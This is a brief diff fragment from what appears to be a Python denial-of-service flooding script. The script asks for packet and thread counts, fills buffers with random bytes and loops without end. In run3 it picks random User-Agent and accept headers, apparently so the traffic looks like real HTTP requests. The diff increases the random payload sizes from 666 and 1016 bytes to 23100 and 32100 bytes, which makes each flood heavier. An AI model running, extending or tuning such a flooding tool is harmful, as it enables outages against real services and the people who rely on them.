@@ -78,7 +78,7 @@ times = int(input("PACKETS : "))
 threads = int(input("THREADS : "))
 os.system("clear")
 def run():
-	data = random._urandom(666)
+	data = random._urandom(23100)
 	i = random.choice(("[☂]","[☂]","[☂]"))
 	while True:
 		try:
@@ -107,7 +107,7 @@ def run2():
 			
 def run3():
     global useragents, ref, acceptall
-    hh = random._urandom(1016)
+    hh = random._urandom(32100)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
